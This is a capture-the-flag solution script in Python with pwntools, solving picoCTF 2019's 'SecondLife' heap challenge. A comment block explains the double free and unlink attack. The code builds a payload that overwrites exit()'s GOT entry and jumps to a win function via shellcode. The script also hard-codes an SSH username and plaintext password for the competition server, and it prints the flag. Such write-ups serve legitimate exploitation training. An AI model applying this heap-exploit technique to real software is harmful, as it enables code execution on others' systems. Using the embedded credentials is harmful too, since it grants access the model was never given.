#!/usr/bin/env python3

######################################## Write-Up ########################################
# Category: Binary Exploitation
# Points: 400 (solved after comp)
# Description: Just pwn this program using a double free and get a flag. It’s also found in /problems/secondlife_2_ecf87473c7934afc6ea15edd2ee954ca on the shell server.
#
# The way we exploit this chall is the same as the one for AfterLife, except that the vuln
# is caused by a double free, which is free()ing an already freed chunk. Because of the
# vuln, the fd and bk pointers of the "first" points to itself, and when the program
# malloc()s the "sixth" chunk, when gets(sixth) is run, you are writing into the "first"
# chunk. The double free also allows a second instance of the "first" chunk to be in
# the fastbin list, thus allowing for GOT overwrite via unlink attack.
#
# Flag: picoCTF{HeapHeapFlag_d11a9aaf}
# Solved by: Ryan Nguyen
##########################################################################################

from pwn import *

exe = ELF("vuln")

context.binary = exe
context.log_level = 'debug'

# Addrs
exit_got = 0x804d02c
win = "0x08048956"

def conn():
	if False:
		return process([exe.path]) # program needs an argument, doesn't matter; doesn't work locally bc there are sec checks on UAFs and unlink attacks (gj computer)
	else:
		shell = ssh(host='2019shell1.picoctf.com', user='giggsterpuku', password='7WH@L3ftc2')
		return shell.process(['vuln'], cwd='/problems/secondlife_2_ecf87473c7934afc6ea15edd2ee954ca')

def main():
	r = conn()
	r.recvline()
	heap = int(r.recvline())
	log.info("Heap address: {}".format(hex(heap)))
	r.sendline("a") # Program runs fgets() in the middle to fill in the "first" chunk
	r.recvuntil("useful...")
	shellcode = asm("push " + win + "; ret;") # making instructions for calling win; if we tried GOT overwriting exit() w/ win, the code at win would be corrupted due to the effects of the unlink attack
	r.sendline(p32(exit_got - 12) + p32(heap + 8) + shellcode) # when interpreted by malloc(), exit_got - 12 is where faux "chunk" starts -> so when u edit exit()'s GOT you overwtie it at the right address; heap + 8 is where shellcode starts
	#gdb.attach(r)
	r.interactive()


if __name__ == "__main__":
	main()
